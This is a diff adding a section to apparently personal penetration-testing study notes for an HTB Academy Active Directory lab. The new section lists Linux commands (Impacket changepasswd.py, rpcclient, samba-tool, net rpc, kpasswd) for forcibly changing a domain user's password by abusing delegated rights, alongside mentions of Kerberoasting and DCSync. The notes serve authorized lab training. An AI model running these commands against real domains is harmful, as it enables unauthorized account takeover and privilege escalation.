@@ -265,6 +265,64 @@ Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname=
 
  The last step is to attempt to crack the password offline using Hashcat. Once we have the cleartext password, we could now authenticate as the `adunn` user and perform the DCSync attack
 
+## CHANGING PASSWORDS WITH LINUX 
+
+`Set-DomainUserPassword` in PowerView changes a **domain** user's password (assuming you have the rights — `GenericAll`, `GenericWrite`, `User-Force-Change-Password` extended right, etc. over that user object). The direct equivalents on Linux are:
+
+**Impacket's `changepasswd.py`** — closest 1:1 match:
+
+bash
+
+```bash
+changepasswd.py INLANEFREIGHT.LOCAL/attacker:'AttackerPass' -newpass 'NewP@ssw0rd!' -user targetuser -altuser attacker -altpass 'AttackerPass'
+```
+
+Or more simply, if you're changing your own compromised account's password:
+
+bash
+
+```bash
+changepasswd.py inlanefreight.local/targetuser@dc01.inlanefreight.local -newpass 'NewP@ssw0rd!'
+```
+
+**`rpcclient`** — using SAMR, similar to how PowerView talks over the same protocol underneath:
+
+bash
+
+```bash
+rpcclient -U attacker%AttackerPass //dc01.inlanefreight.local -c "setuserinfo2 targetuser 23 'NewP@ssw0rd!'"
+```
+
+**`samba-tool`** — if you're on a box with Samba tools and rights (e.g. DA creds or delegated rights):
+
+bash
+
+```bash
+samba-tool user setpassword targetuser --newpassword='NewP@ssw0rd!'
+```
+
+**`net rpc password`** (Samba's `net` binary, old-school but still works):
+
+bash
+
+```bash
+net rpc password targetuser 'NewP@ssw0rd!' -U attacker%AttackerPass -S dc01.inlanefreight.local
+```
+
+**`kpasswd`** (Kerberos-native, if you have creds/hash for a ticket):
+
+bash
+
+```bash
+kpasswd targetuser@INLANEFREIGHT.LOCAL
+```
+
+### Key considerations, same as PowerView
+
+- You need one of: a delegated right on the target user object (`ForceChangePassword`, `GenericWrite`, `GenericAll`), or high-priv creds (DA/EA)
+- Password policy still applies (complexity, length, history) — a bad password will get rejected same as in AD from Windows
+- Changing a password is loud — it's an obvious, logged, and often alerted-on action (event 4724/4738 on the DC). Only do it when it's actually the right move (e.g. `ForceChangePassword` abuse chain on HTB Academy where you have no other path in), not as your default move on a box you own
+- Kerberoasting/etc. don't need this — this is specifically for abusing write privileges over an account, so make sure that's actually your scenario before reaching for it
 ## Cleanup - notforoscp
 
 #### Removing the Fake SPN from adunn's Account
